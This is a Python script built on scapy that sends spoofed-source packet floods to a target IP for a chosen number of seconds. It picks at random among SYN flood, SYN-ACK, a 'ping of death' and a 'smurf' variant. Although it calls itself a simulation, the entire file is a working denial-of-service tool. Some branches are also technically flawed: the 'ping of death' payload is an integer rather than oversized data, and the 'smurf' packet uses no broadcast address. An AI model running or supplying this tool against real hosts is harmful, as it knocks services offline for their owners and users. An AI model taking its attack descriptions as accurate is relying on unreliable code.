import ipaddress
import argparse
import random
import time

from scapy.all import IP, TCP, ICMP, Raw, send


def random_ip():
    # Generate a random IPv4 address
    return str(ipaddress.IPv4Address(random.randint(0, 2 ** 32 - 1)))  # Convert a random integer to an IPv4 address


def ddos(target_ip, duration):
    # Function to simulate DDoS attack
    target_port = 12345  # Set the target port for the attack
    start_time = time.time()
    while time.time() - start_time < duration:   # Continue the attack for the specified duration
        src_ip = random_ip()  # Generate a random source IP address
        attack_type = random.choice(("syn_flood", "pod", "syn_ack", "smurf"))  # Randomly choose an attack type
        if attack_type == "syn_flood":
            # Perform a SYN flood attack
            src_port = random.randint(1024, 65535)
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")  # Create a SYN packet
            send(pkt, verbose=0)  # Send the packet silently
        elif attack_type == "pod":
            # Perform a Ping of Death (POD) attack
            load = 1000
            pkt = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load=load)    # Create an ICMP packet with a payload
            send(pkt, verbose=0)
        elif attack_type == "syn_ack":
            # Perform a SYN-ACK attack
            src_port = random.randint(1024, 65535)
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")  # Create a SYN-ACK packet
            send(pkt, verbose=0)
        elif attack_type == "smurf":
            # Perform a Smurf attack
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()  # Create an ICMP packet with the target IP as both source and destination
            send(pkt, verbose=0)


if __name__ == "__main__":
    # Main entry point of the script
    parser = argparse.ArgumentParser(description="DDoS attack simulation")  # Create argument parser
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds")

    args = parser.parse_args()  # Parse command-line arguments

    ddos(args.target_ip, args.duration)  # Execute the DDoS function with provided arguments
